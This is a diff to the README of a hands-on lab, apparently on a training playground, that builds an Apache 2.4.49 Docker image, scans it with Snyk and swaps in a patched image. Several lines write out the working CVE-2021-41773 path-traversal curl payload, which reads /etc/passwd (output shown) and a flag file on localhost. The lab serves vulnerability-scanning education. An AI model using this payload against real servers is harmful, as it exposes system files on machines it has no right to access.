@@ -1,4 +1,10 @@
-# CVE-2021-41773
+# Snyk Vulnerability Scanning: Readme
+
+This scenario involves building a Docker image which includes a vulnerabile package, installed via the Dockerfile.
+
+## Vulnerable Packages
+
+#### CVE-2021-41773
 
 CVE-2021-41773 is a CVE within the Apache HTTP Server, specifically version 2.4.49. 
 
@@ -10,8 +16,6 @@ CVE-2021-41773 is a CVE within the Apache HTTP Server, specifically version 2.4.
 ## CVE Lab
 
 This lab contains a vulnerable Dockerfile, which includes the Apache 2.4.49 package and its associated configuratons which this CVE required to be installed.
-
-We can
 
 
 ## Scanning with Snyk 
@@ -28,7 +32,7 @@ You can now start to scan local images using Snyk. Snyk will analyise the depend
 Snyk is already installed on the Playground instances, so we can skip this step.
 
 
-## Building and Scanning Vulnerable IMage
+## Building and Scanning Vulnerable Image
 
 There are two directories within the Docker directory, both containing a Dockerfile and a set of dependencies.
 
@@ -37,7 +41,7 @@ There are two directories within the Docker directory, both containing a Dockerf
 
 To build the vulnerable image, run the following command:
 
-```
+```bash
 $ cd workdir/dpg2021publicnov/snyk/docker
 $ bash build.sh
 ```
@@ -46,7 +50,7 @@ This will create a Docker image using the Dockerfile located in the `vulnerable`
 
 Now you have built the vulnerable Docker image, it's time to scan this using Snyk. To scan a Docker image, run the following:
 
-```
+```bash
 $ snyk container test apache-vulnerable
 
 
@@ -126,14 +130,14 @@ This will start a new container, using the apache-vulnerable image, mapping the 
 Lets test we can connect to the server:
 
 ```bash
-curl localhost:9000
+$ curl localhost:9000
 ```
 
 
 Now, to run the exploit:
 
-```
-curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+```bash
+$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 
 [playground@worker3-snyk ~]$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 root:x:0:0:root:/root:/bin/bash
@@ -161,8 +165,8 @@ This will exploit a flaw in the directory traversal code of the Apache HTTPD ser
 
 To actually retrieve the flag, we will change the command to print the contents of /etc/flag.txt:
 
-```
-curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
+```bash
+$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
 ```
 
 
@@ -174,8 +178,8 @@ Included in the `docker` directory is a directory called `safe` which includes p
 
 Let's run the following command to build the safe image (apache-safe):
 
-```
-bash build_safe.sh
+```bash
+$ bash build_safe.sh
 ```
 
 You can create a new container using this image (remember to stop the first one by running docker kill <ID>)
@@ -187,7 +191,7 @@ $ docker run -d -p 9000:80  apache-safe
 Run the exploit:
 
 ```
-curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
+$ curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
 ```
 
 And to scan the new image to confirm the vulnerability is no longer present:
